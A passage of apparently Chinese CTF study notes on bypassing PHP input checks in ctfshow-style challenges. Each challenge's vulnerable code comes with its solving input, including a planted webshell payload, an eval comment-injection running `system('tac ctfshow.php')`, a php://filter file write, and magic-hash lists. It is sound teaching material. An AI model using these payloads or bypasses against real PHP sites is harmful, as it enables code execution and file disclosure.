punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?num[]=1</code></p><h2 id="2、进制绕过"><a href="#2、进制绕过" class="headerlink" title="2、进制绕过"></a>2、进制绕过</h2><p>可以用2,8,16(八进制开头为0)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>intval($num,0)</code>自动匹配num的进制，然后转换</p><p><code>?num=0x117C</code> <code>0x117C==4476</code></p><p> intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。</p><p>所以为了绕过前面的&#x3D;&#x3D;4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以 </p><h2 id="3、换行绕过-0a"><a href="#3、换行绕过-0a" class="headerlink" title="3、换行绕过(%0a)"></a>3、换行绕过(%0a)</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">#考虑换行</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">#不考虑换行</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?cmd=%0aphp</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token comment">#0不可以是第一个</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?num= 010574</code></p><h2 id="4、路径绕过"><a href="#4、路径绕过" class="headerlink" title="4、路径绕过./"></a>4、路径绕过<code>./</code></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?u=./flag.php</code></p><h2 id="5、MD5绕过"><a href="#5、MD5绕过" class="headerlink" title="5、MD5绕过"></a>5、MD5绕过</h2><p> <a href="https://blog.csdn.net/weixin_53146913/article/details/124050009">https://blog.csdn.net/weixin_53146913/article/details/124050009</a> [MD5碰撞]</p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>a[]=1&amp;b[]=2</code></p><p>弱类型碰撞</p><p>  sha1后以0E开头<br>    sha1(‘aaroZmOk’)<br>    sha1(‘aaK1STfY’)<br>    sha1(‘aaO8zKZF’)<br>    sha1(‘aa3OFF9m’) </p><p>md5后以0E开头</p><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><p>s1885207154a<br>0e509367213418206700842008763514</p><p>s1502113478a<br>0e861580163291561247404381396064</p><p>s1885207154a<br>0e509367213418206700842008763514</p><h2 id="6、in-array绕过"><a href="#6、in-array绕过" class="headerlink" title="6、in_array绕过"></a>6、in_array绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为数组</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向数组里面插入随机数</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><span class="token comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写入1.php文件</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>#payload: get : ?n=1.php post:content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、注释绕过"><a href="#7、注释绕过" class="headerlink" title="7、注释绕过"></a>7、注释绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#赋值运算优先于比较运算符,v2,v3无需是数字</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">#v2没有;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">#v3必须分号</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于eval中一定要有;代表代码结束，所以可以使用<code>/**/</code>把<code>(&#39;ctfshow&#39;)</code>注释掉最后在v3中写；即<code>/*(&#39;ctfshow&#39;)*/;</code></p><p><code>?v1=21&amp;v2=system(&#39;tac ctfshow.php&#39;)/*&amp;v3=*/;</code></p><p> $flag_is_aa9f2ee70x2dd3ee0x2d44460x2d9bff0x2d43481712e211 </p><p>aa9f2ee70x2dd3ee0x2d44460x2d9bff0x2d43481712e211（0x2d&#x3D;&gt;-）</p><p>aa9f2ee7-d3ee-4446-9bff-43481712e211 </p><h2 id="8、利用反射"><a href="#8、利用反射" class="headerlink" title="8、利用反射"></a>8、利用反射</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反射可以通过字符串创建类 <code>new Reflectionclass</code></p><p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p><p>f32ff9c8-7e0a-4dbb-8d4f-d71d5881459</p><p>少了一位爆破得到</p><p>f32ff9c8-7e0a-4dbb-8d4f-d71d58814592</p><h2 id="9、hex2bin构造危险函数"><a href="#9、hex2bin构造危险函数" class="headerlink" title="9、hex2bin构造危险函数"></a>9、hex2bin构造危险函数</h2><p>bin2hex  函数把ASCII 字符转换为 十六进制值的字符串</p><p>hex2bin  函数把十六进制值的字符串转换为 ASCII 字符</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足hex2bin解码都可以命令执行，有为纯数字就目前只有唯一解</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">GETv2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.phpPOSTv1=hex2bin#访问1.php后查看源代码获得flag115044383959474e6864434171594473==头两位截取==>5044383959474e6864434171594473==bin2hex==>PD89YGNhdCAqYDs==Base64解码==>&lt;?=`cat *`;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10、php的变量覆盖"><a href="#10、php的变量覆盖" class="headerlink" title="10、php的变量覆盖"></a>10、php的变量覆盖</h2><h3 id="flag"><a href="#flag" class="headerlink" title="$flag"></a>$flag</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token comment">#重点</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token comment">#重点</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token 